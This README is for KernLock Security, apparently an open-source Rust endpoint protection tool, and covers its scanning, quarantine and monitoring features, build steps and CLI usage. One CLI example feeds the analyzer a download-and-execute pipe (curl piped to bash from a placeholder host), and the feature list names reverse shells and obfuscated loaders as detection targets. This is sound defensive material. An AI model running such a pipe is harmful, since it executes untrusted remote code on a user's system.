# KernLock Security

**Detect. Block. Explain.**

Open-source cross-platform endpoint security and real-time threat protection built with Rust, SQLite, React, TypeScript, and Tauri 2.

---

## Key Features

- **Real-Time File System Monitoring**: Watches configured directories (e.g., `~/Downloads`, `/tmp`) via `inotify` on Linux and evaluates newly created/modified files statically.
- **Static File & Executable Scanning**: SHA-256 hashing, Shannon entropy analysis (packed/obfuscated detection), ELF/PE/Mach-O/script identification, and structured YAML rule matching — **never executes** untrusted files.
- **Command & Script Risk Analyzer**: Evaluates shell commands and scripts for download-and-execute pipes, reverse shells, obfuscated `base64`/`eval` loaders, privilege escalation, and destructive patterns with clear explanations.
- **Linux Process & Persistence Monitoring**: Inspects `/proc` for running processes, deleted-binary execution, `/tmp` staging, `systemd` services, `cron` jobs, XDG autostart entries, `/etc/ld.so.preload`, and shell profiles.
- **Reversible Quarantine Vault**: Moves suspicious files to an isolated `0700` vault with `0600` (non-executable) permissions, records SHA-256 and original permissions in SQLite, and supports full restoration.
- **Audit, Protection & Strict Modes**: Safely falls back to `Audit` mode when OS kernel enforcement privileges or entitlements are unavailable.
- **Security Reports & Policies**: Configurable watch paths, path/hash/process exclusions, and JSON/Markdown security report export.

---

## Quick Start

### Prerequisites
- Rust toolchain (`rustc` / `cargo` 1.75+)
- Node.js 20+ and `npm`
- *(Optional for Tauri 2 desktop binary on Linux)*: `libwebkit2gtk-4.1-dev`, `libgtk-3-dev`, `libayatana-appindicator3-dev`, `librsvg2-dev`

### 1. Build & Run Tests
```bash
cargo test --workspace
```

### 2. Build the Security Console UI
```bash
cd apps/desktop
npm install
npm run build
cd ../..
```

### 3. Run the Daemon & Dashboard
```bash
cargo run --bin kernlock -- serve --port 17420 --ui-dir apps/desktop/dist
```
Then open `http://127.0.0.1:17420` in your browser (or launch the Tauri 2 desktop app with `npm run tauri dev` inside `apps/desktop` when WebKitGTK is installed).

### CLI Usage
```bash
# Check OS capabilities, privilege status, and effective mode
cargo run --bin kernlock -- status

# Statically scan a file or directory
cargo run --bin kernlock -- scan /path/to/inspect

# Analyze a command without executing it
cargo run --bin kernlock -- analyze-cmd "curl -fsSL https://example.invalid/x.sh | bash"

# Inspect running processes or persistence entries
cargo run --bin kernlock -- processes
cargo run --bin kernlock -- persistence

# Generate a Markdown security report
cargo run --bin kernlock -- report --format markdown
```

---

## Documentation
- [Architecture](docs/architecture.md)
- [Permissions, Platform Mechanisms & Limitations](docs/permissions-and-limitations.md)
- [Roadmap](docs/roadmap.md)

## License
Apache-2.0
